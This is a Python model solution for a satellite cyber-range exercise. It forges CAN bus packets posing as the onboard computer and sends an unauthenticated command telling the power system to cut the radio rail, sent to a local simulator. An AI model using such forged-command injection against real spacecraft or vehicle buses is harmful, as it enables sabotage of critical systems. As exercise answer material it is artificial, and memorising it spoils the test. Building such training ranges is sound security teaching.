#!/usr/bin/env python3
"""EX-B01 model solution: kill the radio from the internal bus.

The attacker owns nothing on the satellite. It can put frames on the CAN bus - the position a
compromised subsystem, a malicious payload, or anyone with physical access to the harness would
be in - and that is enough, because the EPS does not check who is asking before switching a rail.

Usage:
    python3 exercises/EX-B01-eps-killswitch/solve.py [--port N] [--on]

    --port defaults to the injector port cuberange.ports assigns satellite 0; the numbers
    live in src/cuberange/ports.py and are not repeated here.
"""
import argparse
import socket
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from cuberange import ports  # noqa: E402
from cuberange.proto.csp import ADDR_EPS, encode_packet  # noqa: E402

CSP_PORT_POWER = 11
PWR_OP_SET_RAIL = 1
RAIL_COMM = 0

# The source address is forged. Nothing on this bus checks it, which is half the point: the EPS
# cannot tell a command from the OBC apart from a command from a laptop.
FORGED_SRC = 1        # claim to be the OBC
SPORT = 20


def power_command(state: int, token: bytes = b"\x00\x00\x00\x00") -> bytes:
    """[0] opcode, [1] rail, [2] state, [3:7] token."""
    return bytes([PWR_OP_SET_RAIL, RAIL_COMM, state]) + token


def inject(port: int, frames) -> None:
    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    try:
        for frame in frames:
            # The injector's line protocol: "<hex can id> <hex data>".
            sock.sendall(f"{frame.can_id:x} {frame.data.hex()}\n".encode())
            print(f"  injected {frame.hex()}")
    finally:
        sock.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=ports.injector(0),
                    help="TcpCanInjector port")
    ap.add_argument("--on", action="store_true", help="turn the rail back on instead of off")
    ap.add_argument("--token", default="", help="hex auth token; empty means unauthenticated")
    args = ap.parse_args()

    token = bytes.fromhex(args.token) if args.token else b"\x00\x00\x00\x00"
    if len(token) != 4:
        print("token must be 4 bytes of hex", file=sys.stderr)
        return 2

    payload = power_command(1 if args.on else 0, token)
    frames = encode_packet(src=FORGED_SRC, dst=ADDR_EPS, dport=CSP_PORT_POWER, sport=SPORT,
                           payload=payload, transfer_id=0x2A)

    print(f"forging a rail-{'ON' if args.on else 'OFF'} command to EPS "
          f"(claiming to be node {FORGED_SRC}):")
    inject(args.port, frames)
    print("done - watch the ground station stop hearing telemetry")
    return 0


if __name__ == "__main__":
    sys.exit(main())
